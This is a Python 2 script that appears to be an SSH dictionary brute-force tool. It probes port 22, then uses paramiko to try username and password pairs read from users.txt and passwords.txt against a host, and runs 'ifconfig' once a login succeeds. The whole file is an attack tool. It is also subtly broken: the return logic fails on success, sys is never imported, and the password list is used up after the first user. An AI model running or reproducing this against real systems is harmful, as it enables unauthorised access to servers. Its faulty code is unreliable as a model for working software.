# -*- encoding: utf-8 -*-
#class for SSH connection

import paramiko
import socket
             
class SSHConnection:
    
    def __init__(self):
        #ssh connection with paramiko library
        self.ssh = paramiko.SSHClient()
    
    def ssh_connect(self,ip,user,password,code=0):
        
        self.ssh.load_system_host_keys()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        print("[*] Testing user and password from dictionary")
        print("[*] User: %s" %(user))
        print("[*] Pass :%s" %(password))
        
        try:
            self.ssh.connect(ip,port=22,username=user,password=password, timeout=5)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error,e:
            code = 2

            self.ssh.close()
            return code
	    
    def startSSHBruteForce(self,host):
        try:
            #open files dictionary
            users_file = open("users.txt")
            passwords_file = open("passwords.txt")

            for user in users_file.readlines():
                for password in passwords_file.readlines():
                
                    user_text = user.strip("\n")
                    password_text = password.strip("\n")

                    try:
                                    #check connection with user and password
                                    response = self.ssh_connect(host,user_text,password_text)
                                    if response == 0:
                                            print("[*] User: %s [*] Pass Found:%s" %(user_text,password_text))
                                            stdin,stdout,stderr = self.ssh.exec_command("ifconfig")
                                            for line in stdout.readlines():
                                                print line.strip()
                                            sys.exit(0)
                                    elif response == 1:
                                        print("[*] User: %s [*] Pass %s => Login incorrect !!!" %(user,password))
                                    elif response == 2:
                                        print("[*] Connection could not be established to %s" %(host))
                                        sys.exit(2)
				
                    except Exception,e:
                                print "Error ssh connection"
                                pass
            #close files
            users_file.close()
            passwords_file.close()
        
        except Exception,e:
            print "users.txt /passwords.txt Not found"
            pass
    
    def SSHBruteForce(self,host):
        #check port 22 is open
        try:
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host,22))
            if result == 0:
                print "Port 22 open"
                response = raw_input ("Would you like start brute force process over "+ host +"?[s/n]")
                if response == "s" or response == "S":
                        self.startSSHBruteForce(host)
            else:
                print "Port SSH 22 closed"
            sock.close()
        except KeyError:
            # Key is not present
            print "Error checking ports!"
            pass
        except socket.gaierror:
            print 'Hostname could not be resolved. Exiting'
            sys.exit()
        except socket.error:
            print "Couldn't connect to server"
            sys.exit()